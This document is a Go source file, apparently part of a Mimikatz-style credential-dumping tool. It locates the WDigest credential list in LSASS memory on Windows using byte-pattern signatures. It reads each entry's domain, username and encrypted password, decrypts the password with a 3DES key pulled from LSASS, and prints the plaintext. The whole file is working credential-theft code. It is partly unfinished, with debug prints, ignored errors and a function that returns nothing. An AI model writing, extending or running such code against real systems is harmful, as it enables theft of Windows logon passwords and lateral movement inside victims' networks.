package kiwi

import (
	"bytes"
	"fmt"
	"reflect"
	"unicode/utf16"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/logger"
	"project/internal/module/windows/api"
)

var (
	patternWin5X64PasswordSet = []byte{0x48, 0x3B, 0xDA, 0x74}
	patternWin6X64PasswordSet = []byte{0x48, 0x3B, 0xD9, 0x74}

	patternWin64X86PasswordSet = []byte{0x74, 0x15, 0x8B, 0x0F, 0x39, 0x4E, 0x10}

	wdigestReferences = map[uint32]*patchGeneric{
		buildWinVista: {
			search: &patchPattern{
				length: len(patternWin6X64PasswordSet),
				data:   patternWin6X64PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: 48},
		},
	}
)

func (kiwi *Kiwi) searchWdigestCredentialAddress(pHandle windows.Handle) error {
	wdigest, err := kiwi.getLSASSBasicModuleInfo(pHandle, "wdigest.DLL")
	if err != nil {
		return err
	}
	// read wdigest.dll memory
	memory := make([]byte, wdigest.size)
	_, err = api.ReadProcessMemory(pHandle, wdigest.address, &memory[0], uintptr(wdigest.size))
	if err != nil {
		return errors.WithMessage(err, "failed to read memory about wdigest.DLL")
	}
	// search logon session list pattern
	patch := wdigestReferences[buildWinVista]

	index := bytes.Index(memory, patch.search.data)
	if index == -1 {
		return errors.WithMessage(err, "failed to search wdigest primary pattern")
	}
	address := wdigest.address + uintptr(index+patch.offsets.off0)
	var offset int32
	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
	if err != nil {
		return errors.WithMessage(err, "failed to read offset about wdigest credential address")
	}
	wdigestCredAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
	kiwi.logf(logger.Debug, "wdigest credential address is 0x%X", wdigestCredAddr)
	kiwi.wdigestPrimaryOffset = patch.offsets.off1
	kiwi.wdigestCredAddr = wdigestCredAddr
	return nil
}

type wdigestListEntry struct {
	fLink      uintptr
	bLink      uintptr
	usageCount uint32
	this       uintptr
	luid       windows.LUID
}

type genericPrimaryCredential struct {
	Username api.LSAUnicodeString
	Domain   api.LSAUnicodeString
	Password api.LSAUnicodeString
}

// Wdigest contains credential information.
type Wdigest struct {
	Domain   string
	Username string
	Password string
}

func (kiwi *Kiwi) getWdigestList(pHandle windows.Handle, logonID windows.LUID) ([]*Wdigest, error) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.wdigestCredAddr == 0 {
		err := kiwi.searchWdigestCredentialAddress(pHandle)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to search wdigest credential address")
		}
	}
	address := kiwi.wdigestCredAddr
	// read wdigest credential data address
	var addr uintptr
	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&addr)), unsafe.Sizeof(addr))
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read wdigest credential list address")
	}
	kiwi.logf(logger.Debug, "wdigest credential data address is 0x%X", addr)
	// read linked list address by LUID
	var resultAddr uintptr // TODO for what?
	for {
		if addr == address {
			break
		}
		size := unsafe.Offsetof(wdigestListEntry{}.luid) + unsafe.Sizeof(windows.LUID{})
		var entry wdigestListEntry
		_, err = api.ReadProcessMemory(pHandle, addr, (*byte)(unsafe.Pointer(&entry)), size)
		if err != nil {
			break
		}
		if logonID == entry.luid {
			resultAddr = addr
			break
		}
		addr = entry.fLink
	}
	fmt.Printf("0x%X\n", resultAddr)

	size := uintptr(kiwi.wdigestPrimaryOffset + int(unsafe.Sizeof(genericPrimaryCredential{})))

	var cred genericPrimaryCredential
	credAddr := uintptr(int(addr) + kiwi.wdigestPrimaryOffset)
	_, err = api.ReadProcessMemory(pHandle, credAddr, (*byte)(unsafe.Pointer(&cred)), size)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read wdigest primary credential")
	}

	domain, err := api.ReadLSAUnicodeString(pHandle, &cred.Domain)

	username, err := api.ReadLSAUnicodeString(pHandle, &cred.Username)

	if username == "" {
		return nil, nil
	}

	// read encrypted password
	lus := cred.Password
	if lus.MaximumLength != 0 {
		data := make([]byte, int(lus.MaximumLength))
		_, err := api.ReadProcessMemory(pHandle, lus.Buffer, &data[0], uintptr(lus.MaximumLength))
		if err != nil {

		}
		fmt.Println(data)

		pwd := make([]byte, len(data))

		// iv will be changed, so we need copy
		iv := make([]byte, 8)
		copy(iv, kiwi.iv[:8])

		api.BCryptDecrypt(kiwi.key3DES, data, 0, iv, pwd)

		var utf16Str []uint16
		sh := (*reflect.SliceHeader)(unsafe.Pointer(&utf16Str))
		sh.Len = int(lus.Length / 2)
		sh.Cap = int(lus.Length / 2)
		sh.Data = uintptr(unsafe.Pointer(&pwd[0]))

		fmt.Println(pwd)
		fmt.Println(len(utf16.Decode(utf16Str)))

		fmt.Println("final password:", string(utf16.Decode(utf16Str)))
	}

	password, err := api.ReadLSAUnicodeString(pHandle, &cred.Password)

	// decrypt password

	fmt.Println("Domain:", domain)
	fmt.Println("Username:", username)
	fmt.Println("Password:", password)

	return nil, nil

}
